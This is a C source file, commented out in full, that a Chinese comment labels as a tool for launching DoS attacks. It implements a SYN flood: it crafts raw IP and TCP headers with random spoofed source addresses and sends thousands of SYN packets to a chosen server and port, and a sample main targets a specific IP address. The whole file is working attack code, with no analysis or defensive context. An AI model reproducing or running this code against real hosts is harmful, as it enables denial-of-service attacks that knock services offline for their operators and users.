///**
// * 用来攻进行dos攻击
// */
//#include <stdio.h> 
//#include <sys/types.h> 
//#include <sys/socket.h> 
//#include <netdb.h> 
//#include <unistd.h> 
//#include <stdlib.h> 
//#include <netinet/ip.h> 
//#include <netinet/tcp.h> 
//#include <errno.h> 
//#include <string.h> 
//#include <sys/socket.h> 
//#include <netinet/in.h> 
//#include <arpa/inet.h> 
//
//struct pseudohdr {
//    struct in_addr saddr;
//    struct in_addr daddr;
//    u_char zero;
//    u_char protocol;
//    u_short length;
//    struct tcphdr tcpheader;
//};
//
//u_short checksum(u_short * data, u_short length) {
//    int nleft = length;
//    int sum = 0;
//    unsigned short *w = data;
//    unsigned short value = 0;
//    while (nleft > 1) {
//        sum += *w++;
//        nleft -= 2;
//    }
//    if (nleft == 1) {
//        *(unsigned char *) (&value) = *(unsigned char *) w;
//        sum += value;
//    }
//    sum = (sum >> 16)+(sum & 0xffff);
//    sum += (sum >> 16);
//    value = ~sum;
//    return value;
//}
//
///**
// * 欺骗
// * @param serverip
// * @param serverport
// * @param localport
// * @return 
// */
//int spoof(char* serverip, int serverport, int times) {
//    unsigned long srcport;
//    struct sockaddr_in sin; //服务器地址
//    struct sockaddr_in din; //本机
//    struct hostent* hoste; //服务器地址
//    struct hostent* host1; //本机
//    int j, sock, foo;
//    char buffer[40];
//    struct ip* ipheader = (struct ip*) buffer;
//    struct tcphdr * tcpheader = (struct tcphdr*) (buffer + sizeof (struct ip));
//    struct pseudohdr pseudoheader;
//    bzero(&sin, sizeof (struct sockaddr_in));
//    sin.sin_family = AF_INET;
//    char src_ip[20] = {0};
//    sprintf(src_ip, "%d.%d.%d.%d", rand() % 250 + 1, rand() % 250 + 1, rand() % 250 + 1, rand() % 250 + 1);
//    host1 = gethostbyname(src_ip);
//    bcopy(host1->h_addr, &din.sin_addr, host1->h_length);
//    hoste = gethostbyname(serverip);
//    bcopy(hoste->h_addr, &sin.sin_addr, hoste->h_length);
//    sin.sin_port = htons(serverport);
//    if ((sock = socket(AF_INET, SOCK_RAW, 255)) == -1) {
//        fprintf(stderr, "couldn't   allocate   raw   socket!\n");
//        return -1;
//    }
//    foo = 1;
//    if (setsockopt(sock, 0, IP_HDRINCL, (char *) &foo, sizeof (int)) == -1) {
//        fprintf(stderr, "couldn't   set   raw   header   on   socket   \n");
//        return -1;
//    }
//    for (j = 0; j < times; j++) {
//        char src_ip[20] = {0};
//        sprintf(src_ip, "%d.%d.%d.%d", rand() % 250 + 1, rand() % 250 + 1, rand() % 250 + 1, rand() % 250 + 1);
//        host1 = gethostbyname(src_ip);
//        bcopy(host1->h_addr, &din.sin_addr, host1->h_length);
//        bzero(&buffer, sizeof (struct ip) + sizeof (struct tcphdr));
//        ipheader->ip_v = 4;
//        ipheader->ip_tos = 0;
//        ipheader->ip_hl = sizeof (struct ip) / 4;
//        ipheader->ip_len = sizeof (struct ip) + sizeof (struct tcphdr);
//        ipheader->ip_id = htons(random());
//        ipheader->ip_ttl = 30; /*255*/
//        ipheader->ip_p = IPPROTO_TCP;
//        ipheader->ip_sum = 0;
//        ipheader->ip_src = din.sin_addr;
//        ipheader->ip_dst = sin.sin_addr;
//
//        srcport = random() % 15000 + 10000;
//        tcpheader->th_sport = htons(srcport); /*sin.sin_port*/
//        tcpheader->th_dport = sin.sin_port;
//        tcpheader->th_seq = htonl(0x28374839);
//        tcpheader->th_flags = TH_SYN;
//        tcpheader->th_off = sizeof (struct tcphdr) / 4;
//        tcpheader->th_win = htons(2048);
//        tcpheader->th_sum = 0;
//
//        bzero(&pseudoheader, 12 + sizeof (struct tcphdr));
//        pseudoheader.saddr.s_addr = din.sin_addr.s_addr;
//        pseudoheader.daddr.s_addr = sin.sin_addr.s_addr;
//        pseudoheader.protocol = 6;
//        pseudoheader.length = htons(sizeof (struct tcphdr));
//        tcpheader->th_sum = checksum((u_short *) & pseudoheader, 12 + sizeof (struct tcphdr));
//        ssize_t c = sendto(sock, buffer, sizeof (struct ip) + sizeof (struct tcphdr), 0, (struct sockaddr *) &sin, sizeof (struct sockaddr_in));
//        if (c <= 0) {
//            fprintf(stderr, "couldn't   send   packet  %d \n", errno);
//            return -1;
//        } else {
//            fprintf(stdout, ".");
//            fflush(stdout);
//        }
//    }
//    close(sock);
//    return 1;
//}
//
////int main(int argc, char * argv[]) {
////    spoof("1.168.10.151", 8888, 10000);
////    return 0;
////}
